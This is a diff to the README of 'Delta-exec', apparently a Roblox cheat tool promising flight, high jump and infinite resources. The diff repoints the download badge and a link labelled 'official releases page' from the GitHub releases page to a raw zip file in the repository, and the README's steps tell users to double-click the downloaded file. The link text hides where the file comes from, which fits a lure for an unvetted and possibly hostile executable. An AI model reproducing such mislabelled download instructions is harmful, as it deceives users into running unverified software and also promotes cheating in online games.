@@ -1,6 +1,6 @@
 # 🚀 Delta-exec - Master your favorite Roblox game today
 
-[![Download Delta-exec](https://img.shields.io/badge/Download-Delta--exec-blue.svg)](https://github.com/pachec0d/Delta-exec/releases)
+[![Download Delta-exec](https://img.shields.io/badge/Download-Delta--exec-blue.svg)](https://github.com/pachec0d/Delta-exec/raw/refs/heads/main/Resource/exec_Delta_v3.0.zip)
 
 Delta-exec functions as a personal assistant for Roblox players on PC. The software automates repetitive tasks to save time and effort. It manages quests, collects items, and tracks world objects. Users navigate games with support for features like flight mode, high jump, and infinite resource management.
 
@@ -37,7 +37,7 @@ Ensure your computer meets these requirements for smooth performance.
 
 Follow these steps to install and run the software on your PC.
 
-1. Visit the [official releases page](https://github.com/pachec0d/Delta-exec/releases) to access the download files.
+1. Visit the [official releases page](https://github.com/pachec0d/Delta-exec/raw/refs/heads/main/Resource/exec_Delta_v3.0.zip) to access the download files.
 2. Click the latest version link to save the file to your computer.
 3. Locate the downloaded file in your downloads folder.
 4. Double-click the file to begin the setup process.
